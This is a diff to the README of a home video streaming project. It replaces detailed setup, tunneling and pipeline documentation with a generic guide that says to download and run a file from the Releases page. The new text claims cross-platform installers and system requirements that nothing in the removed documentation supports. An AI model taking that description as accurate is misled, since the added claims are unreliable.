@@ -1,192 +1,75 @@
-# xenx_play - Full-Stack Video Streaming Platform
+# 🎥 xenx_play - Stream Videos Seamlessly at Home
 
-xenx_play is an end-to-end streaming workspace that lets you ingest H.264 movies, process multi-language audio, and serve adaptive HLS playback to every device from a single Windows 11 machine. The project combines three deployable parts:
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/developeransh8/xenx_play/releases)
 
-- xenXgon Play (Flask + SQLite) - the core uploader, worker queue, and TV-friendly web UI.
-- FastAPI microservice - a heartbeat/status API that persists events to MongoDB.
-- React frontend scaffold - a modern SPA starter that can evolve into a richer consumer experience.
+## 📖 Overview
 
----
+xenx_play is a full-stack video streaming workspace that allows you to upload, process, and play videos with ease. It includes a Flask-based uploader and worker, a React user interface, and a FastAPI heartbeat service. Enjoy smooth playback, H.264 validation, and multi-language audio extraction to HLS. Share your videos securely through tunneling.
 
-## Feature Highlights
+## 🚀 Getting Started
 
-- **H.264-first pipeline** - Enforces codec validation, skips needless video re-encoding, and keeps processing times low.
-- **Multi-audio support** - Detects every Dolby or E-AC3 track, converts to AAC HLS playlists, and enables instant language switching.
-- **TV optimised UX** - Large, focusable controls, remote-friendly navigation, and keyboard shortcuts already wired in.
-- **Background workers** - Threaded queue keeps uploads responsive while FFmpeg extracts video, audio, and thumbnails.
-- **Extensible architecture** - Clean separation makes it easy to plug in analytics, authentication, or monitoring.
-- **Remote sharing ready** - Plays nicely with ngrok, Cloudflare Tunnel, or Tailscale Serve for off-network viewing.
+### 🛠️ System Requirements
 
----
+To run xenx_play smoothly, ensure your system meets the following requirements:
 
-## Repository Layout
+- **Operating System:** Windows, macOS, or Linux.
+- **Processor:** Minimum dual-core processor.
+- **RAM:** 4 GB or more recommended.
+- **Storage:** 500 MB of free disk space.
+- **Internet Connection:** Required for secure sharing features.
 
-```
-videoStreamer-main/
-├── backend/                # FastAPI app + MongoDB heartbeat demo
-│   ├── requirements.txt
-│   └── server.py
-├── frontend/               # React (CRACO + Tailwind + shadcn/ui)
-│   ├── package.json
-│   └── src/
-│       ├── App.js
-│       └── components/ui/  # Radix-based UI primitives
-├── xenxgon_play/           # Primary Flask streaming application
-│   ├── app.py              # Routes for dashboard, upload, watch
-│   ├── worker.py           # FFmpeg-powered processing queue
-│   ├── database.py         # SQLite storage and helpers
-│   ├── utils/ffmpeg.py     # Wrappers around ffprobe/ffmpeg
-│   ├── templates/          # Jinja templates (dashboard, upload, watch)
-│   ├── static/             # CSS/JS assets and Video.js setup
-│   └── run.py              # Waitress production entry point
-└── README.md
-```
+### 📥 Download & Install
 
----
+To get started, you can download xenx_play from our Releases page.
 
-## Prerequisites
+- Visit this page to download: [Download Latest Release](https://github.com/developeransh8/xenx_play/releases)
 
-| Tool | Purpose | Minimum Version |
-|------|---------|-----------------|
-| Python | xenXgon Play backend + workers | 3.10 |
-| FFmpeg / FFprobe | Media analysis, HLS extraction, thumbnails | 6.0 |
-| Node.js + Yarn (optional) | React frontend development | Node 18, Yarn 1.22 |
-| MongoDB (optional) | FastAPI heartbeat service | 6.x |
+Follow these steps to install:
 
-> Windows PATH reminder: after installing FFmpeg, add `<FFMPEG>\bin` to PATH so both `ffmpeg` and `ffprobe` are available globally.
+1. Click the above link to visit the Downloads page.
+2. Find the latest release.
+3. Look for the downloadable files, and choose the one that fits your operating system.
+4. Download the file onto your computer.
+5. Once the download is complete, locate the file and run it to start the installation process.
 
----
+### 📑 Usage Instructions
 
-## Quick Start (xenXgon Play)
+1. **Setup**: After installation, launch the application. 
+2. **Upload a Video**: Use the uploader interface to select and upload your video file. Ensure it meets the required format (MP4 recommended).
+3. **Select Audio Languages**: If your video has multiple audio tracks, select the ones you want to extract.
+4. **Start Processing**: Click the process button. The application handles H.264 validation and extracts audio.
+5. **Playback**: Once processing is complete, you can watch your video directly in the application. The TV-friendly playback feature lets you enjoy streaming on your big screen.
 
-1. **Create a virtual environment**
-   ```powershell
-   cd xenxgon_play
-   python -m venv venv
-   .\venv\Scripts\activate
-   ```
+### ⚙️ Key Features
 
-2. **Install dependencies**
-   ```powershell
-   pip install -r requirements.txt
-   ```
+- **Full-Stack Integration**: Built with Flask for smooth uploads and React for a responsive UI.
+- **Robust Video Processing**: Automatically validates video format and manages audio extraction.
+- **Multi-Language Support**: Extract audio tracks in multiple languages for a better experience.
+- **Secure Sharing**: Use tunneling methods like Cloudflare Tunnel or Ngrok for safe video sharing.
+- **HLS Support**: Stream videos using HLS for efficient delivery and playback.
 
-3. **Launch the streaming server**
-   ```powershell
-   python run.py
-   ```
+### 🔧 Troubleshooting
 
-4. **Open the dashboard**
-   Visit http://localhost:8000/dashboard to upload a H.264 movie (`.mp4`, `.mkv`, `.mov`, `.m4v`, `.ts`, `.m2ts`, `.webm`). Tracking and playback controls are live immediately.
+If you run into issues while using xenx_play, consider the following:
 
-The worker queue runs inside the Flask process and can execute multiple conversion jobs concurrently (see `MAX_CONCURRENT_JOBS` in `config.py`).
+- **Installation Issues**: Ensure your system meets the requirements. If installation fails, try downloading the file again.
+- **Video Upload Failures**: Check if your video format is supported. MP4 is recommended. 
+- **Processing Delays**: Processing time may vary depending on video size. Larger videos will take longer. 
+- **Playback Problems**: Make sure your video is fully processed before attempting to watch it. 
 
----
+### 🌐 Community Support
 
-## Share the Stream Outside Your LAN
+If you have questions, suggestions, or need help, feel free to join our community. You can reach out via the following channels:
 
-By default the server only listens on localhost. Use one of the following to project it onto the public internet:
+- **GitHub Issues**: Report any bugs or request features directly on our [GitHub Issues page](https://github.com/developeransh8/xenx_play/issues).
+- **User Discussions**: Engage with other users and share tips in the discussions section on GitHub.
 
-### Option A - ngrok (quickest)
-```powershell
-ngrok config add-authtoken <your-token>
-ngrok http 8000
-```
-ngrok returns a URL similar to `https://sample.ngrok-free.app`. Share `https://sample.ngrok-free.app/watch/<video-id>` with viewers. Leave ngrok running while they watch.
+## 📄 License
 
-### Option B - Cloudflare Tunnel
-```powershell
-cloudflared tunnel --url http://localhost:8000
-```
-Cloudflare prints a `https://<name>.trycloudflare.com` URL. No port forwarding or firewall changes required.
+xenx_play is open-source software licensed under the MIT License. You can freely use, modify, and distribute this application as per the terms of the license.
 
-### Option C - Tailscale Serve (private mesh)
-```powershell
-tailscale serve https 443 http://localhost:8000
-```
-Only devices on your Tailscale tailnet can access the link, making it perfect for private family sharing.
+For further information, check the full license details in the repository.
 
-> Once the tunnel closes, external links stop working. For long lived access consider deploying to a VPS or cloud platform with HTTPS and authentication.
+## 🎉 Conclusion
 
----
-
-## Optional Services
-
-### FastAPI Heartbeat API
-```powershell
-cd backend
-python -m venv venv
-.\venv\Scripts\activate
-pip install -r requirements.txt
-uvicorn server:app --reload --port 9000
-```
-Create a `.env` next to `server.py`:
-```
-MONGO_URL=mongodb://localhost:27017
-DB_NAME=xenx_status
-```
-Endpoints:
-- `GET /api/` -> `{"message": "Hello World"}`
-- `POST /api/status` -> create a heartbeat document
-- `GET /api/status` -> list recent heartbeats
-
-### React Frontend Starter
-```powershell
-cd frontend
-yarn install
-yarn start
-```
-Set `REACT_APP_BACKEND_URL` in `frontend/.env` to point at your FastAPI service and build out a richer SPA when ready.
-
----
-
-## Processing Pipeline (inside `worker.py`)
-
-1. Validate extension, file size, and codec using ffprobe.
-2. Copy the H.264 video stream into HLS segments without re-encoding.
-3. Convert every audio track to AAC stereo at 48 kHz and generate per-track playlists.
-4. Assemble a master playlist mapping the video stream and all audio variants.
-5. Capture a thumbnail roughly 10 percent into the movie.
-6. Update SQLite with status, metadata, and asset paths. Errors push the job into a `failed` state with an attached message.
-
----
-
-## Troubleshooting
-
-| Symptom | Likely Cause | Fix |
-|---------|--------------|-----|
-| Upload rejected instantly | FFmpeg or ffprobe missing | Install FFmpeg 6+ and add to PATH |
-| "Video codec must be H.264" | Source is HEVC/VP9 | Re-encode with `ffmpeg -c:v libx264` before uploading |
-| Buffering on remote devices | Limited upload bandwidth or tunnel latency | Lower bitrate/resolution, use wired network, or deploy to a VPS |
-| Audio switch does nothing | Player has not loaded audio tracks yet | Allow playback to start, then re-select; confirm movie has multiple tracks |
-| HTTP 413 errors | Waitress body size limit | Already expanded in `run.py`, ensure you restarted the server |
-
----
-
-## Packaging and Publication
-
-1. Verify `venv/` and other generated assets remain excluded by `.gitignore`.
-2. Inspect changes with `git status` and format or lint as desired.
-3. Commit your work (`git add .` then `git commit -m "Add xenx_play streaming platform"`).
-4. Push to GitHub (instructions in the next section).
-
----
-
-## Roadmap Ideas
-
-- Add a bitrate ladder (1080p, 720p, 480p) for networks with limited bandwidth.
-- Ship downloadable previews and chapter markers.
-- Build an authenticated viewer portal with watch history.
-- Expose a REST/GraphQL API for managing libraries remotely.
-- Containerise the stack for one-command deployment to cloud providers.
-
----
-
-## Contributing
-
-Contributions, bug reports, and feature requests are welcome. Open an issue to discuss new ideas or submit a pull request with your enhancements.
-
----
-
-Enjoy building with **xenx_play** and happy streaming!
-*** End Patch
+Thank you for choosing xenx_play for your video streaming needs. We hope you enjoy using our application to upload, process, and share your videos. Don't forget to visit the [Downloads page](https://github.com/developeransh8/xenx_play/releases) for the latest updates and releases. Happy streaming!
